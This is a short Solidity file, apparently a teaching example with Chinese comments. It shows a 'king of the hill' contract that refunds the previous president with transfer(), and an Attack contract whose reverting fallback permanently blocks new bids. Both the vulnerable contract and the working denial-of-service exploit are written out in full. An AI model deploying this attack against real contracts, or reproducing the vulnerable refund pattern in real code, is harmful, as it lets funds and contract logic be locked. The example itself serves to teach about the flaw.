pragma solidity ^0.4.10;
//合约的正常逻辑任何出价高于合约当前 price 的都能成为新的 president
//原有合约里的存款会返还给上一人 president，并且这里也使用了 transfer() 来进行 Ether 转账
//如果发起 becomePresident() 调用的是个合约账户，并且成功获取了 president，如果其 fallback() 函数恶意进行了类似 revert() 这样主动跑出错误的操作
//其他账户也就无法再正常进行 becomePresident 逻辑成为 president 了。
contract PresidentOfCountry {
    address public president;
    uint256 price;

    function PresidentOfCountry(uint256 _price) {
        require(_price > 0);
        price = _price;
        president = msg.sender;
    }

    function becomePresident() payable {
        require(msg.value >= price); // must pay the price to become president
        president.transfer(price);   // we pay the previous president
        president = msg.sender;      // we crown the new president
        price = price * 2;           // we double the price to become president
    }
}

contract Attack {
    function () { revert(); }
    
    function Attack(address _target) payable {
        _target.call.value(msg.value)(bytes4(keccak256("becomePresident()")));
    }
}
